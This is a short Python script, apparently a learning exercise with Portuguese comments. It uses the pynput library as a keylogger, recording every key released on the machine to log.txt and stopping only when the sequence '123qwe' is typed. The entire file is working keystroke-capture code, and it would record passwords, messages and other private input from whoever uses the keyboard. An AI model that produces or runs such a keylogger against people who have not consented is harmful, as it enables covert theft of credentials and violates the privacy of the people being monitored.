from pynput import keyboard
from pynput.keyboard import Controller, Listener, Key
from collections import deque


password = ['1', '2', '3', 'q', 'w', 'e']
keys = deque(maxlen=6) #fila de extremidade dupla
controlKeyBoard = Controller()

def log(text):

    # with é usado para garantir finalização de recursos adquiridos. 
    # o arquivo é aberto e o with garanta para que ele seja fechado
    with open('log.txt', 'a') as file_log:
        if(text == '  |->Key.enter<-|  '):
            file_log.write('[ENTER]\n')
        else:
            file_log.write(text)
        

def monitor(key):
    try:
        log(key.char)
        keys.append(key.char)
       
    except AttributeError: #tratamento caso o texto não seja char
        log('  |->' + str(key) + '<-|  ')
        keys.append(str(key))

    #verifica se as ultimas letras digitadas são iguais a senha de pausa
    if ''.join(password) == ''.join(keys):
        return False

with Listener(on_release = monitor) as listener:
    listener.join()